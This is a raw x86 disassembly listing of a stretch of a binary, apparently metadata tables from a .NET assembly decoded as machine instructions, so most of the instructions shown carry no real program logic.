  4069dc:	e1 01                	loope  0x4069df
  4069de:	e0 14                	loopne 0x4069f4
  4069e0:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069e5:	25 00 00 00 00       	and    $0x0,%eax
  4069ea:	86 18                	xchg   %bl,(%eax)
  4069ec:	17                   	pop    %ss
  4069ed:	15 0e 00 5c 00       	adc    $0x5c000e,%eax
  4069f2:	28 55 00             	sub    %dl,0x0(%ebp)
  4069f5:	00 00                	add    %al,(%eax)
  4069f7:	00 96 00 56 0c b1    	add    %dl,-0x4ef3aa00(%esi)
  4069fd:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  406a01:	25 00 00 00 00       	and    $0x0,%eax
  406a06:	96                   	xchg   %eax,%esi
  406a07:	00 56 0c             	add    %dl,0xc(%esi)
  406a0a:	b8 02 5e 00 4c       	mov    $0x4c005e02,%eax
  406a0f:	55                   	push   %ebp
  406a10:	00 00                	add    %al,(%eax)
  406a12:	00 00                	add    %al,(%eax)
  406a14:	96                   	xchg   %eax,%esi
  406a15:	00 56 0c             	add    %dl,0xc(%esi)
  406a18:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a1d:	20 00                	and    %al,(%eax)
  406a1f:	00 00                	add    %al,(%eax)
  406a21:	00 86 18 17 15 0e    	add    %al,0xe151718(%esi)
  406a27:	00 61 00             	add    %ah,0x0(%ecx)
  406a2a:	9e                   	sahf
  406a2b:	25 00 00 00 00       	and    $0x0,%eax
  406a30:	96                   	xchg   %eax,%esi
  406a31:	00 57 0f             	add    %dl,0xf(%edi)
  406a34:	c5 02                	lds    (%edx),%eax
  406a36:	61                   	popa
  406a37:	00 0c 56             	add    %cl,(%esi,%edx,2)
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	00 00                	add    %al,(%eax)
  406a3e:	96                   	xchg   %eax,%esi
  406a3f:	00 70 0c             	add    %dh,0xc(%eax)
  406a42:	cb                   	lret
  406a43:	02 62 00             	add    0x0(%edx),%ah
  406a46:	d4 56                	aam    $0x56
  406a48:	00 00                	add    %al,(%eax)
  406a4a:	00 00                	add    %al,(%eax)
  406a4c:	96                   	xchg   %eax,%esi
  406a4d:	00 4c 1d d2          	add    %cl,-0x2e(%ebp,%ebx,1)
  406a51:	02 64 00 ab          	add    -0x55(%eax,%eax,1),%ah
  406a55:	25 00 00 00 00       	and    $0x0,%eax
  406a5a:	96                   	xchg   %eax,%esi
  406a5b:	00 ed                	add    %ch,%ch
  406a5d:	18 da                	sbb    %bl,%dl
  406a5f:	02 66 00             	add    0x0(%esi),%ah
  406a62:	c6                   	(bad)
  406a63:	25 00 00 00 00       	and    $0x0,%eax
  406a68:	96                   	xchg   %eax,%esi
  406a69:	00 36                	add    %dh,(%esi)
  406a6b:	06                   	push   %es
  406a6c:	e1 02                	loope  0x406a70
  406a6e:	68 00 e6 25 00       	push   $0x25e600
  406a73:	00 00                	add    %al,(%eax)
  406a75:	00 96 00 7a 10 e8    	add    %dl,-0x17ef8600(%esi)
  406a7b:	02 6a 00             	add    0x0(%edx),%ch
  406a7e:	74 57                	je     0x406ad7
  406a80:	00 00                	add    %al,(%eax)
  406a82:	00 00                	add    %al,(%eax)
  406a84:	96                   	xchg   %eax,%esi
  406a85:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a8b:	00 a4 57 00 00 00 00 	add    %ah,0x0(%edi,%edx,2)
  406a92:	96                   	xchg   %eax,%esi
  406a93:	00 ba 13 f6 02 6e    	add    %bh,0x6e02f613(%edx)
  406a99:	00 78 20             	add    %bh,0x20(%eax)
  406a9c:	00 00                	add    %al,(%eax)
  406a9e:	00 00                	add    %al,(%eax)
  406aa0:	86 18                	xchg   %bl,(%eax)
  406aa2:	17                   	pop    %ss
  406aa3:	15 0e 00 70 00       	adc    $0x70000e,%eax
  406aa8:	e8 58 00 00 00       	call   0x406b05
  406aad:	00 96 00 7d 18 84    	add    %dl,-0x7be78300(%esi)
  406ab3:	01 70 00             	add    %esi,0x0(%eax)
  406ab6:	74 59                	je     0x406b11
  406ab8:	00 00                	add    %al,(%eax)
  406aba:	00 00                	add    %al,(%eax)
  406abc:	96                   	xchg   %eax,%esi
  406abd:	00 74 18 84          	add    %dh,-0x7c(%eax,%ebx,1)
  406ac1:	01 71 00             	add    %esi,0x0(%ecx)
  406ac4:	00 00                	add    %al,(%eax)
  406ac6:	01 00                	add    %eax,(%eax)
  406ac8:	d2 0a                	rorb   %cl,(%edx)
  406aca:	00 00                	add    %al,(%eax)
  406acc:	01 00                	add    %eax,(%eax)
  406ace:	d2 0a                	rorb   %cl,(%edx)
  406ad0:	00 00                	add    %al,(%eax)
  406ad2:	01 00                	add    %eax,(%eax)
  406ad4:	d2 0a                	rorb   %cl,(%edx)
  406ad6:	00 00                	add    %al,(%eax)
  406ad8:	01 00                	add    %eax,(%eax)
  406ada:	d2 0a                	rorb   %cl,(%edx)
  406adc:	00 00                	add    %al,(%eax)
  406ade:	01 00                	add    %eax,(%eax)
  406ae0:	d2 0a                	rorb   %cl,(%edx)
  406ae2:	00 00                	add    %al,(%eax)
  406ae4:	01 00                	add    %eax,(%eax)
  406ae6:	d2 0a                	rorb   %cl,(%edx)
  406ae8:	00 00                	add    %al,(%eax)
  406aea:	01 00                	add    %eax,(%eax)
  406aec:	d2 0a                	rorb   %cl,(%edx)
  406aee:	00 00                	add    %al,(%eax)
  406af0:	01 00                	add    %eax,(%eax)
  406af2:	d2 0a                	rorb   %cl,(%edx)
  406af4:	00 00                	add    %al,(%eax)
  406af6:	01 00                	add    %eax,(%eax)
  406af8:	d2 0a                	rorb   %cl,(%edx)
  406afa:	00 00                	add    %al,(%eax)
  406afc:	01 00                	add    %eax,(%eax)
  406afe:	d2 0a                	rorb   %cl,(%edx)
  406b00:	00 00                	add    %al,(%eax)
  406b02:	01 00                	add    %eax,(%eax)
  406b04:	b3 07                	mov    $0x7,%bl
  406b06:	00 00                	add    %al,(%eax)
  406b08:	01 00                	add    %eax,(%eax)
  406b0a:	64 13 00             	adc    %fs:(%eax),%eax
  406b0d:	00 02                	add    %al,(%edx)
  406b0f:	00 b8 08 00 00 03    	add    %bh,0x3000008(%eax)
  406b15:	00 c2                	add    %al,%dl
  406b17:	10 00                	adc    %al,(%eax)
  406b19:	00 04 00             	add    %al,(%eax,%eax,1)
  406b1c:	34 18                	xor    $0x18,%al
  406b1e:	00 00                	add    %al,(%eax)
  406b20:	01 00                	add    %eax,(%eax)
  406b22:	e4 12                	in     $0x12,%al
  406b24:	00 00                	add    %al,(%eax)
  406b26:	01 00                	add    %eax,(%eax)
  406b28:	2b 0d 00 00 01 00    	sub    0x10000,%ecx
  406b2e:	d1 0d 00 00 01 00    	rorl   $1,0x10000
  406b34:	d1 0d 00 00 01 00    	rorl   $1,0x10000
  406b3a:	3b 0d 00 00 01 00    	cmp    0x10000,%ecx
  406b40:	e6 18                	out    %al,$0x18
  406b42:	00 00                	add    %al,(%eax)
  406b44:	01 00                	add    %eax,(%eax)
  406b46:	d0 04 00             	rolb   $1,(%eax,%eax,1)
  406b49:	00 02                	add    %al,(%edx)
  406b4b:	00 0f                	add    %cl,(%edi)
  406b4d:	1c 00                	sbb    $0x0,%al
  406b4f:	00 03                	add    %al,(%ebx)
  406b51:	00 74 1b 00          	add    %dh,0x0(%ebx,%ebx,1)
  406b55:	00 01                	add    %al,(%ecx)
  406b57:	00 3b                	add    %bh,(%ebx)
  406b59:	07                   	pop    %es
  406b5a:	00 00                	add    %al,(%eax)
  406b5c:	01 00                	add    %eax,(%eax)
  406b5e:	4f                   	dec    %edi
  406b5f:	18 00                	sbb    %al,(%eax)
  406b61:	00 02                	add    %al,(%edx)
  406b63:	00 32                	add    %dh,(%edx)
  406b65:	1b 00                	sbb    (%eax),%eax
  406b67:	00 01                	add    %al,(%ecx)
  406b69:	00 0d 17 00 00 01    	add    %cl,0x1000017
  406b6f:	00 35 00 00 00 02    	add    %dh,0x2000000
  406b75:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b7b:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b81:	00 64 13 00          	add    %ah,0x0(%ebx,%edx,1)
  406b85:	00 02                	add    %al,(%edx)
  406b87:	00 7d 0b             	add    %bh,0xb(%ebp)
  406b8a:	00 00                	add    %al,(%eax)
  406b8c:	01 00                	add    %eax,(%eax)
  406b8e:	b3 07                	mov    $0x7,%bl
  406b90:	00 00                	add    %al,(%eax)
  406b92:	02 00                	add    (%eax),%al
  406b94:	d2 0a                	rorb   %cl,(%edx)
  406b96:	00 00                	add    %al,(%eax)
  406b98:	01 00                	add    %eax,(%eax)
  406b9a:	d2 0a                	rorb   %cl,(%edx)
  406b9c:	00 00                	add    %al,(%eax)
  406b9e:	01 00                	add    %eax,(%eax)
  406ba0:	b3 07                	mov    $0x7,%bl
  406ba2:	00 00                	add    %al,(%eax)
  406ba4:	01 00                	add    %eax,(%eax)
  406ba6:	c4 02                	les    (%edx),%eax
  406ba8:	00 00                	add    %al,(%eax)
  406baa:	01 00                	add    %eax,(%eax)
  406bac:	38 0e                	cmp    %cl,(%esi)
  406bae:	00 00                	add    %al,(%eax)
  406bb0:	01 00                	add    %eax,(%eax)
  406bb2:	57                   	push   %edi
  406bb3:	1c 00                	sbb    $0x0,%al
  406bb5:	00 01                	add    %al,(%ecx)
  406bb7:	00 f3                	add    %dh,%bl
  406bb9:	1c 00                	sbb    $0x0,%al
  406bbb:	00 01                	add    %al,(%ecx)
  406bbd:	00 c7                	add    %al,%bh
  406bbf:	1b 00                	sbb    (%eax),%eax
  406bc1:	00 01                	add    %al,(%ecx)
  406bc3:	00 c7                	add    %al,%bh
  406bc5:	1b 00                	sbb    (%eax),%eax
  406bc7:	00 01                	add    %al,(%ecx)
  406bc9:	00 c7                	add    %al,%bh
  406bcb:	1b 00                	sbb    (%eax),%eax
  406bcd:	00 01                	add    %al,(%ecx)
  406bcf:	00 c7                	add    %al,%bh
  406bd1:	1b 00                	sbb    (%eax),%eax
  406bd3:	00 01                	add    %al,(%ecx)
  406bd5:	00 32                	add    %dh,(%edx)
  406bd7:	00 00                	add    %al,(%eax)
  406bd9:	00 02                	add    %al,(%edx)
  406bdb:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406be1:	00 c7                	add    %al,%bh
  406be3:	1b 00                	sbb    (%eax),%eax
  406be5:	00 01                	add    %al,(%ecx)
  406be7:	00 c7                	add    %al,%bh
  406be9:	1b 00                	sbb    (%eax),%eax
  406beb:	00 01                	add    %al,(%ecx)
  406bed:	00 d1                	add    %dl,%cl
  406bef:	18 00                	sbb    %al,(%eax)
  406bf1:	00 01                	add    %al,(%ecx)
  406bf3:	00 61 16             	add    %ah,0x16(%ecx)
  406bf6:	00 00                	add    %al,(%eax)
  406bf8:	01 00                	add    %eax,(%eax)
  406bfa:	dd 16                	fstl   (%esi)
  406bfc:	00 00                	add    %al,(%eax)
  406bfe:	01 00                	add    %eax,(%eax)
  406c00:	dd 16                	fstl   (%esi)
  406c02:	00 00                	add    %al,(%eax)
  406c04:	01 00                	add    %eax,(%eax)
  406c06:	14 1c                	adc    $0x1c,%al
  406c08:	00 00                	add    %al,(%eax)
  406c0a:	01 00                	add    %eax,(%eax)
  406c0c:	14 1c                	adc    $0x1c,%al
  406c0e:	00 00                	add    %al,(%eax)
  406c10:	01 00                	add    %eax,(%eax)
  406c12:	14 1c                	adc    $0x1c,%al
  406c14:	00 00                	add    %al,(%eax)
  406c16:	01 00                	add    %eax,(%eax)
  406c18:	14 1c                	adc    $0x1c,%al
  406c1a:	00 00                	add    %al,(%eax)
  406c1c:	01 00                	add    %eax,(%eax)
  406c1e:	14 1c                	adc    $0x1c,%al
  406c20:	00 00                	add    %al,(%eax)
  406c22:	01 00                	add    %eax,(%eax)
  406c24:	d1 0d 00 00 01 00    	rorl   $1,0x10000
  406c2a:	be 0d 00 00 02       	mov    $0x200000d,%esi
  406c2f:	00 c9                	add    %cl,%cl
  406c31:	0d 00 00 01 00       	or     $0x10000,%eax
  406c36:	d2 0a                	rorb   %cl,(%edx)
  406c38:	00 00                	add    %al,(%eax)
  406c3a:	01 00                	add    %eax,(%eax)
  406c3c:	d2 0a                	rorb   %cl,(%edx)
  406c3e:	00 00                	add    %al,(%eax)
  406c40:	01 00                	add    %eax,(%eax)
  406c42:	d2 0a                	rorb   %cl,(%edx)
  406c44:	00 00                	add    %al,(%eax)
  406c46:	01 00                	add    %eax,(%eax)
  406c48:	3d 1c 00 00 01       	cmp    $0x100001c,%eax
  406c4d:	00 d2                	add    %dl,%dl
  406c4f:	0a 00                	or     (%eax),%al
  406c51:	00 01                	add    %al,(%ecx)
  406c53:	00 b3 07 00 00 01    	add    %dh,0x1000007(%ebx)
  406c59:	00 b3 07 00 00 01    	add    %dh,0x1000007(%ebx)
  406c5f:	00 ce                	add    %cl,%dh
  406c61:	17                   	pop    %ss
  406c62:	00 00                	add    %al,(%eax)
  406c64:	01 00                	add    %eax,(%eax)
  406c66:	ce                   	into
  406c67:	17                   	pop    %ss
  406c68:	00 00                	add    %al,(%eax)
  406c6a:	01 00                	add    %eax,(%eax)
  406c6c:	d2 0a                	rorb   %cl,(%edx)
  406c6e:	00 00                	add    %al,(%eax)
  406c70:	01 00                	add    %eax,(%eax)
  406c72:	d2 0a                	rorb   %cl,(%edx)
  406c74:	00 00                	add    %al,(%eax)
  406c76:	01 00                	add    %eax,(%eax)
  406c78:	d2 0a                	rorb   %cl,(%edx)
  406c7a:	00 00                	add    %al,(%eax)
  406c7c:	01 00                	add    %eax,(%eax)
  406c7e:	0a 1d 00 00 02 00    	or     0x20000,%bl
  406c84:	d2 0a                	rorb   %cl,(%edx)
  406c86:	00 00                	add    %al,(%eax)
  406c88:	01 00                	add    %eax,(%eax)
  406c8a:	0a 1d 00 00 02 00    	or     0x20000,%bl
  406c90:	d2 0a                	rorb   %cl,(%edx)
  406c92:	00 00                	add    %al,(%eax)
  406c94:	01 00                	add    %eax,(%eax)
  406c96:	32 07                	xor    (%edi),%al
  406c98:	00 00                	add    %al,(%eax)
  406c9a:	01 00                	add    %eax,(%eax)
  406c9c:	32 07                	xor    (%edi),%al
  406c9e:	00 00                	add    %al,(%eax)
  406ca0:	01 00                	add    %eax,(%eax)
  406ca2:	7d 0d                	jge    0x406cb1
  406ca4:	00 00                	add    %al,(%eax)
  406ca6:	01 00                	add    %eax,(%eax)
  406ca8:	d2 0a                	rorb   %cl,(%edx)
  406caa:	00 00                	add    %al,(%eax)
  406cac:	01 00                	add    %eax,(%eax)
  406cae:	7e 0e                	jle    0x406cbe
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	01 00                	add    %eax,(%eax)
  406cb4:	83 0e 00             	orl    $0x0,(%esi)
  406cb7:	00 01                	add    %al,(%ecx)
  406cb9:	00 83 0e 00 00 01    	add    %al,0x100000e(%ebx)
  406cbf:	00 dd                	add    %bl,%ch
  406cc1:	16                   	push   %ss
  406cc2:	00 00                	add    %al,(%eax)
  406cc4:	01 00                	add    %eax,(%eax)
  406cc6:	32 07                	xor    (%edi),%al
  406cc8:	00 00                	add    %al,(%eax)
  406cca:	01 00                	add    %eax,(%eax)
  406ccc:	ce                   	into
  406ccd:	17                   	pop    %ss
  406cce:	00 00                	add    %al,(%eax)
  406cd0:	01 00                	add    %eax,(%eax)
  406cd2:	ce                   	into
  406cd3:	17                   	pop    %ss
  406cd4:	00 00                	add    %al,(%eax)
  406cd6:	01 00                	add    %eax,(%eax)
  406cd8:	d2 0a                	rorb   %cl,(%edx)
  406cda:	00 00                	add    %al,(%eax)
  406cdc:	01 00                	add    %eax,(%eax)
  406cde:	d2 0a                	rorb   %cl,(%edx)
  406ce0:	00 00                	add    %al,(%eax)
  406ce2:	01 00                	add    %eax,(%eax)
  406ce4:	d2 0a                	rorb   %cl,(%edx)
  406ce6:	00 00                	add    %al,(%eax)
  406ce8:	01 00                	add    %eax,(%eax)
  406cea:	ce                   	into
  406ceb:	17                   	pop    %ss
  406cec:	00 00                	add    %al,(%eax)
  406cee:	02 00                	add    (%eax),%al
  406cf0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406cf1:	10 00                	adc    %al,(%eax)
  406cf3:	00 01                	add    %al,(%ecx)
  406cf5:	00 ce                	add    %cl,%dh
  406cf7:	17                   	pop    %ss
  406cf8:	00 00                	add    %al,(%eax)
  406cfa:	01 00                	add    %eax,(%eax)
  406cfc:	87 0b                	xchg   %ecx,(%ebx)
  406cfe:	00 00                	add    %al,(%eax)
  406d00:	02 00                	add    (%eax),%al
  406d02:	ce                   	into
  406d03:	17                   	pop    %ss
  406d04:	00 00                	add    %al,(%eax)
  406d06:	01 00                	add    %eax,(%eax)
  406d08:	ce                   	into
  406d09:	17                   	pop    %ss
  406d0a:	00 00                	add    %al,(%eax)
  406d0c:	01 00                	add    %eax,(%eax)
  406d0e:	ce                   	into
  406d0f:	17                   	pop    %ss
  406d10:	00 00                	add    %al,(%eax)
  406d12:	02 00                	add    (%eax),%al
  406d14:	8d 0e                	lea    (%esi),%ecx
  406d16:	00 00                	add    %al,(%eax)
  406d18:	01 00                	add    %eax,(%eax)
  406d1a:	ce                   	into
  406d1b:	17                   	pop    %ss
  406d1c:	00 00                	add    %al,(%eax)
  406d1e:	02 00                	add    (%eax),%al
  406d20:	d4 16                	aam    $0x16
  406d22:	00 00                	add    %al,(%eax)
  406d24:	01 00                	add    %eax,(%eax)
  406d26:	ce                   	into
  406d27:	17                   	pop    %ss
  406d28:	00 00                	add    %al,(%eax)
  406d2a:	02 00                	add    (%eax),%al
  406d2c:	83 0e 00             	orl    $0x0,(%esi)
  406d2f:	00 01                	add    %al,(%ecx)
  406d31:	00 ce                	add    %cl,%dh
  406d33:	17                   	pop    %ss
  406d34:	00 00                	add    %al,(%eax)
  406d36:	02 00                	add    (%eax),%al
  406d38:	83 0e 00             	orl    $0x0,(%esi)
  406d3b:	00 01                	add    %al,(%ecx)
  406d3d:	00 ce                	add    %cl,%dh
  406d3f:	17                   	pop    %ss
  406d40:	00 00                	add    %al,(%eax)
  406d42:	02 00                	add    (%eax),%al
  406d44:	7e 0e                	jle    0x406d54
  406d46:	00 00                	add    %al,(%eax)
  406d48:	01 00                	add    %eax,(%eax)
  406d4a:	ce                   	into
  406d4b:	17                   	pop    %ss
  406d4c:	00 00                	add    %al,(%eax)
  406d4e:	02 00                	add    (%eax),%al
  406d50:	88 0e                	mov    %cl,(%esi)
  406d52:	00 00                	add    %al,(%eax)
  406d54:	01 00                	add    %eax,(%eax)
  406d56:	ce                   	into
  406d57:	17                   	pop    %ss
  406d58:	00 00                	add    %al,(%eax)
  406d5a:	02 00                	add    (%eax),%al
  406d5c:	88 0e                	mov    %cl,(%esi)
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	01 00                	add    %eax,(%eax)
  406d62:	c7                   	(bad)
  406d63:	1b 00                	sbb    (%eax),%eax
  406d65:	00 01                	add    %al,(%ecx)
  406d67:	00 c7                	add    %al,%bh
  406d69:	1b 16                	sbb    (%esi),%edx
  406d6b:	00 59 00             	add    %bl,0x0(%ecx)
  406d6e:	18 00                	sbb    %al,(%eax)
  406d70:	5d                   	pop    %ebp
  406d71:	00 b1 00 00 1b bb    	add    %dh,-0x44e50000(%ecx)
  406d77:	01 b1 00 ec 1b bf    	add    %esi,-0x40e41400(%ecx)
  406d7d:	01 b1 00 db 19 0e    	add    %esi,0xe19db00(%ecx)
  406d83:	00 b9 00 ff 14 64    	add    %bh,0x6414ff00(%ecx)
  406d89:	02 c9                	add    %cl,%cl
  406d8b:	00 17                	add    %dl,(%edi)
  406d8d:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d92:	17                   	pop    %ss
  406d93:	15 0e 00 d9 00       	adc    $0xd9000e,%eax
  406d98:	17                   	pop    %ss
  406d99:	15 2e 03 e9 00       	adc    $0xe9032e,%eax
  406d9e:	17                   	pop    %ss
  406d9f:	15 6b 01 f1 00       	adc    $0xf1016b,%eax
  406da4:	17                   	pop    %ss
  406da5:	15 6b 01 f9 00       	adc    $0xf9016b,%eax
  406daa:	17                   	pop    %ss
  406dab:	15 6b 01 01 01       	adc    $0x101016b,%eax
  406db0:	17                   	pop    %ss
  406db1:	15 6b 01 09 01       	adc    $0x109016b,%eax
  406db6:	17                   	pop    %ss
  406db7:	15 6b 01 11 01       	adc    $0x111016b,%eax
  406dbc:	17                   	pop    %ss
  406dbd:	15 6b 01 19 01       	adc    $0x119016b,%eax
  406dc2:	17                   	pop    %ss
  406dc3:	15 6b 01 21 01       	adc    $0x121016b,%eax
  406dc8:	17                   	pop    %ss
  406dc9:	15 6b 01 29 01       	adc    $0x129016b,%eax
  406dce:	17                   	pop    %ss
  406dcf:	15 6b 01 31 01       	adc    $0x131016b,%eax
  406dd4:	17                   	pop    %ss
  406dd5:	15 4b 02 39 01       	adc    $0x139024b,%eax
  406dda:	17                   	pop    %ss
  406ddb:	15 0e 00 41 01       	adc    $0x141000e,%eax
  406de0:	17                   	pop    %ss
  406de1:	15 6b 01 49 01       	adc    $0x149016b,%eax
  406de6:	96                   	xchg   %eax,%esi
  406de7:	12 7f 00             	adc    0x0(%edi),%bh
  406dea:	51                   	push   %ecx
  406deb:	01 6e 00             	add    %ebp,0x0(%esi)
  406dee:	c4 03                	les    (%ebx),%eax
  406df0:	59                   	pop    %ecx
  406df1:	01 05 1a 7f 00 51    	add    %eax,0x51007f1a
  406df7:	01 87 10 84 00 09    	add    %eax,0x9008410(%edi)
  406dfd:	00 17                	add    %dl,(%edi)
  406dff:	15 0e 00 61 01       	adc    $0x161000e,%eax
  406e04:	37                   	aaa
  406e05:	01 cd                	add    %ecx,%ebp
  406e07:	03 51 01             	add    0x1(%ecx),%edx
  406e0a:	36 0c 2a             	ss or  $0x2a,%al
  406e0d:	01 61 01             	add    %esp,0x1(%ecx)
  406e10:	c5 0c d3             	lds    (%ebx,%edx,8),%ecx
  406e13:	03 11                	add    (%ecx),%edx
  406e15:	00 17                	add    %dl,(%edi)
  406e17:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e1c:	dc 1c d9             	fcompl (%ecx,%ebx,8)
  406e1f:	03 69 01             	add    0x1(%ecx),%ebp
  406e22:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e23:	1c df                	sbb    $0xdf,%al
  406e25:	03 61 01             	add    0x1(%ecx),%esp
  406e28:	cb                   	lret
  406e29:	16                   	push   %ss
  406e2a:	e5 03                	in     $0x3,%eax
  406e2c:	81 01 e2 01 c7 00    	addl   $0xc701e2,(%ecx)
  406e32:	79 01                	jns    0x406e35
  406e34:	4d                   	dec    %ebp
  406e35:	0d eb 03 19 00       	or     $0x1903eb,%eax
  406e3a:	17                   	pop    %ss
  406e3b:	15 09 04 19 00       	adc    $0x190409,%eax
  406e40:	5d                   	pop    %ebp
  406e41:	0b 01                	or     (%ecx),%eax
  406e43:	03 19                	add    (%ecx),%ebx
  406e45:	00 4a 0b             	add    %cl,0xb(%edx)
  406e48:	01 03                	add    %eax,(%ebx)
  406e4a:	c1 01 81             	roll   $0x81,(%ecx)
  406e4d:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e52:	f7 19                	negl   (%ecx)
  406e54:	1c 04                	sbb    $0x4,%al
  406e56:	d1 01                	roll   $1,(%ecx)
  406e58:	17                   	pop    %ss
  406e59:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e5e:	f0 1b 23             	lock sbb (%ebx),%esp
  406e61:	04 d9                	add    $0xd9,%al
  406e63:	01 08                	add    %ecx,(%eax)
  406e65:	16                   	push   %ss
  406e66:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e69:	00 5e 19             	add    %bl,0x19(%esi)
  406e6c:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e6f:	00 45 03             	add    %al,0x3(%ebp)
  406e72:	bf 01 19 00 5e       	mov    $0x5e001901,%edi
  406e77:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e7a:	99                   	cltd
  406e7b:	01 17                	add    %edx,(%edi)
  406e7d:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e82:	17                   	pop    %ss
  406e83:	15 36 02 99 01       	adc    $0x1990236,%eax
  406e88:	78 17                	js     0x406ea1
  406e8a:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e8d:	01 61 0c             	add    %esp,0xc(%ecx)
  406e90:	70 01                	jo     0x406e93
  406e92:	c1 01 f7             	roll   $0xf7,(%ecx)
  406e95:	19 3f                	sbb    %edi,(%edi)
  406e97:	04 d1                	add    $0xd1,%al
  406e99:	01 f0                	add    %esi,%eax
  406e9b:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e9e:	f1                   	int1
  406e9f:	01 75 08             	add    %esi,0x8(%ebp)
  406ea2:	0e                   	push   %cs
  406ea3:	00 f9                	add    %bh,%cl
  406ea5:	01 17                	add    %edx,(%edi)
  406ea7:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406eac:	17                   	pop    %ss
  406ead:	15 56 04 21 00       	adc    $0x210456,%eax
  406eb2:	17                   	pop    %ss
  406eb3:	15 5c 04 19 00       	adc    $0x19045c,%eax
  406eb8:	44                   	inc    %esp
  406eb9:	1b 66 04             	sbb    0x4(%esi),%esp
  406ebc:	09 00                	or     %eax,(%eax)
  406ebe:	7c 0c                	jl     0x406ecc
  406ec0:	47                   	inc    %edi
  406ec1:	02 21                	add    (%ecx),%ah
  406ec3:	00 80 1a 6c 04 29    	add    %al,0x29046c1a(%eax)
  406ec9:	02 17                	add    (%edi),%dl
  406ecb:	15 56 04 29 00       	adc    $0x290456,%eax
  406ed0:	17                   	pop    %ss
  406ed1:	15 78 04 31 02       	adc    $0x2310478,%eax
  406ed6:	17                   	pop    %ss
  406ed7:	15 56 04 c1 00       	adc    $0xc10456,%eax
  406edc:	18 03                	sbb    %al,(%ebx)
  406ede:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406ee2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406ee3:	07                   	pop    %es
  406ee4:	8f 04 31             	pop    (%ecx,%esi,1)
  406ee7:	00 88 17 96 04 c1    	add    %cl,-0x3efb69e9(%eax)
  406eed:	00 75 08             	add    %dh,0x8(%ebp)
  406ef0:	0e                   	push   %cs
  406ef1:	00 19                	add    %bl,(%ecx)
  406ef3:	00 75 08             	add    %dh,0x8(%ebp)
  406ef6:	0e                   	push   %cs
  406ef7:	00 29                	add    %ch,(%ecx)
  406ef9:	00 75 08             	add    %dh,0x8(%ebp)
  406efc:	0e                   	push   %cs
  406efd:	00 c1                	add    %al,%cl
  406eff:	00 10                	add    %dl,(%eax)
  406f01:	03 a1 04 49 02 6e    	add    0x6e024904(%ecx),%esp
  406f07:	00 a7 04 c1 00 1d    	add    %ah,0x1d00c104(%edi)
  406f0d:	03 ae 04 51 02 17    	add    0x17025104(%esi),%ebp
  406f13:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f18:	17                   	pop    %ss
  406f19:	15 b6 04 49 01       	adc    $0x14904b6,%eax
  406f1e:	a9 1b bd 04 61       	test   $0x6104bd1b,%eax
  406f23:	02 98 14 cf 04 49    	add    0x4904cf14(%eax),%bl
  406f29:	02 cb                	add    %bl,%cl
  406f2b:	16                   	push   %ss
  406f2c:	9f                   	lahf
  406f2d:	01 19                	add    %ebx,(%ecx)
  406f2f:	00 52 0f             	add    %dl,0xf(%edx)
  406f32:	d6                   	salc
  406f33:	04 c1                	add    $0xc1,%al
  406f35:	00 f3                	add    %dh,%bl
  406f37:	08 de                	or     %bl,%dh
  406f39:	04 59                	add    $0x59,%al
  406f3b:	02 17                	add    (%edi),%dl
  406f3d:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f42:	be 11 15 02 c1       	mov    $0xc1021511,%esi
  406f47:	00 58 0d             	add    %bl,0xd(%eax)
  406f4a:	0e                   	push   %cs
  406f4b:	00 61 02             	add    %ah,0x2(%ecx)
  406f4e:	05 1a 9a 00 71       	add    $0x71009a1a,%eax
  406f53:	02 56 19             	add    0x19(%esi),%dl
  406f56:	0a 00                	or     (%eax),%al
  406f58:	59                   	pop    %ecx
  406f59:	01 e0                	add    %esp,%eax
  406f5b:	15 c7 00 a1 02       	adc    $0x2a100c7,%eax
  406f60:	ed                   	in     (%dx),%eax
  406f61:	07                   	pop    %es
  406f62:	01 05 79 02 17 15    	add    %eax,0x15170279
  406f68:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f6b:	02 58 18             	add    0x18(%eax),%bl
  406f6e:	07                   	pop    %es
  406f6f:	05 81 02 b3 06       	add    $0x6b30281,%eax
  406f74:	0d 05 a9 02 fc       	or     $0xfc02a905,%eax
  406f79:	06                   	push   %es
  406f7a:	47                   	inc    %edi
  406f7b:	02 b1 02 67 07 47    	add    0x47076702(%ecx),%dh
  406f81:	02 c1                	add    %cl,%al
  406f83:	01 8d 1d 16 04 81    	add    %ecx,-0x7efbe9e3(%ebp)
  406f89:	02 fb                	add    %bl,%bh
  406f8b:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f90:	4d                   	dec    %ebp
  406f91:	0f 0e                	femms
  406f93:	00 89 02 17 15 0e    	add    %cl,0xe151702(%ecx)
  406f99:	00 89 02 09 07 6b    	add    %cl,0x6b070902(%ecx)
  406f9f:	01 b1 02 f3 06 47    	add    %esi,0x4706f302(%ecx)
  406fa5:	02 a1 02 fa 10 c7    	add    -0x38ef05fe(%ecx),%ah
  406fab:	00 c1                	add    %al,%cl
  406fad:	01 d3                	add    %edx,%ebx
  406faf:	18 1a                	sbb    %bl,(%edx)
